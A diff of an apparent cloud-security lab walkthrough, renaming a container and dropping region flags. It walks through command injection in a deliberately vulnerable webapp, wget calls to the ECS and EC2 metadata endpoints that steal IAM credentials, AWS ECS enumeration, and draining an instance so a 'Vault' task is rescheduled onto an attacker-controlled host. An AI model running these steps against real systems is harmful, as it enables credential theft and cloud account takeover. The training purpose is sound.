@@ -4,27 +4,27 @@
     ; echo 'hello world'
     ```
 
-2. Using command injection list all of the containers on the host. You should see images for "vulnsite:latest" and "busybox:latest". 
-vulnsite is hosting the webapp that you just exploited, and busybox is sleeping for a year (literally), but runs as a role that will be
+2. Using command injection list all of the containers on the host. You should see containers with name containing "vulnsite" and "privd". 
+vulnsite is hosting the webapp that you just exploited, and privd is sleeping for a year (literally), but runs as a role that will be
 relevant to us later.
     
     ```bash
    ; docker ps
    ```
 
-   The ID for the busybox container the will be the first field in the output from the following command.
+   The ID for the privd container the will be the first field in the output from the following command.
     
     ```bash
-   ; docker ps | grep busybox
+   ; docker ps | grep privd
    ```
 
-3. Using command injection get the container credentials for the busybox container as well as the host ECS instance. If you've not seen the endpoints
+3. Using command injection get the container credentials for the privd container as well as the host ECS instance. If you've not seen the endpoints
 listed below, they are very common targets. 
 
    ```bash
-   ; docker exec <busybox container id> sh -c 'wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
-   ; docker exec <busybox container id> sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/'
-   ; docker exec <busybox container id> sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/<your-specific-ecs-agent>'
+   ; docker exec <privd container id> sh -c 'wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
+   ; docker exec <privd container id> sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/'
+   ; docker exec <privd container id> sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/<your-specific-ecs-agent>'
    ```
    
 You can learn more about ECS Task roles here: 
@@ -32,25 +32,25 @@ https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-iam-roles.html
 And ec2 metadata here: 
 https://docs.aws.amazon.com/AWSEC2/latest/WindowsGuide/instancedata-data-retrieval.html
 
-4. With the escalated credentials from the busybox container, list the clusters in the account then enumerate the tasks.
+4. With the escalated credentials from the privd container, list the clusters in the account then enumerate the tasks.
 
    ```bash
-   aws --profile <container_credentials> ecs list-clusters --region <your_region>
-   aws --profile <container_credentials> ecs list-tasks --cluster <your_cluster_name> --query taskArns --out text --region <your_region>
+   aws --profile <container_credentials> ecs list-clusters
+   aws --profile <container_credentials> ecs list-tasks --cluster <your_cluster_name> --query taskArns --out text
    ```
    After listing all of the tasks, you can use the following commands to iterate over them and get some more information.
    
    ```bash
    # the following command will describe the target task which will include the name of the corresponding service:
-   aws --profile <container_credentials> --region <your_region> ecs describe-tasks --cluster <your_cluster_name> --tasks <target_task>
+   aws --profile <container_credentials> ecs describe-tasks --cluster <your_cluster_name> --tasks <target_task>
    # this command will reveal if the service is scheduled as a replica or daemon.
-   aws --profile <container_credentials> --region <your_region> ecs describe-services --cluster <your_cluster_name> --services <target_service>
+   aws --profile <container_credentials> ecs describe-services --cluster <your_cluster_name> --services <target_service>
    ```
    
-5. This next step is the crux of the whole operation. In the previous step you will have listed out all of the tasks and their corresponding ecs instances (which are the ec2 instances that tasks, and therefore docker containers, are running on). You'll also know how each service is scheduled. We see that on a second ecs instance there is a task that we have previously not had access to. Because that task is scheduled as a replica, ecs will attempt to rechedule it on an available ecs instance if it's current host instance goes down for some reason. We can deliberately take that instance down using the credentials we got from the host earlier, forcing it to be rescheduled onto an instance that we have more control over.
+5. This next step is the crux of the whole operation. In the previous step you will have listed out all of the tasks and their corresponding ecs instances (which are the ec2 instances that tasks, and therefore docker containers, are running on). You'll also know how each service is scheduled. We see that on a second ecs instance there is a task that we have previously did not have access to. Because that task is scheduled as a replica, ecs will attempt to rechedule it on an available ecs instance if it's current host instance goes down for some reason. We can deliberately take that instance down using the credentials we got from the host earlier, forcing it to be rescheduled onto an instance that we have more control over.
 
    ```bash
-   aws --profile <host_credentials> ecs update-container-instances-state --cluster <your_cluster_name> --container-instances <target_container_instance> --status DRAINING --region us-east-1
+   aws --profile <host_credentials> ecs update-container-instances-state --cluster <your_cluster_name> --container-instances <target_container_instance> --status DRAINING
    ```
 
 6. Wait for "Vault" container to be rescheduled, this can be checked by running docker via command injection.
